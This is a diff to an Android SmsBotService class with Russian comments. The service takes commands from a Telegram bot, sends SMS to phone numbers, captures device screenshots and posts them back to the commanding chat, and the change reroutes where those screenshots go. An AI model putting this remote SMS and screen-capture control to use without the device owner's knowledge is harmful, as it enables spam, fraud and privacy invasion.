@@ -20,13 +20,14 @@ import org.json.*;
 public class SmsBotService extends Service {
     private boolean running = true;
     private String botToken = "";
+    private SharedPreferences prefs;
 
     @Override
     public void onCreate() {
         super.onCreate();
-        startForeground(1, buildNotification());
-        SharedPreferences prefs = getSharedPreferences("smsbot", MODE_PRIVATE);
+        prefs = getSharedPreferences("smsbot", MODE_PRIVATE);
         botToken = prefs.getString("bot_token", "");
+        startForeground(1, buildNotification());
         new Thread(() -> {
             while (running) {
                 if (!botToken.isEmpty()) {
@@ -68,10 +69,11 @@ public class SmsBotService extends Service {
 
                         // Делаем скриншот
                         byte[] screenshot = takeScreenshot();
-                        // Отправляем результат в цель, сохранённую в префах
+                        // Получаем ID целевой группы (предположим, пришло вместе с командой, модифицируем /send)
+                        // Пока упрощённо: отправим фото в личку боту, а бот перешлёт
                         String targetGroup = prefs.getString("target_group", "");
-                        if (screenshot != null && !targetGroup.isEmpty()) {
-                            sendPhotoToChat(targetGroup, screenshot, "✅ Доставлено: " + phone);
+                        if (screenshot != null) {
+                            sendPhotoToChat(msg.getJSONObject("chat").getString("id"), screenshot, "✅ Доставлено: " + phone);
                         } else {
                             sendMessageToChat(msg.getJSONObject("chat").getString("id"), "✅ Доставлено: " + phone + "\n⚠ Без скрина");
                         }
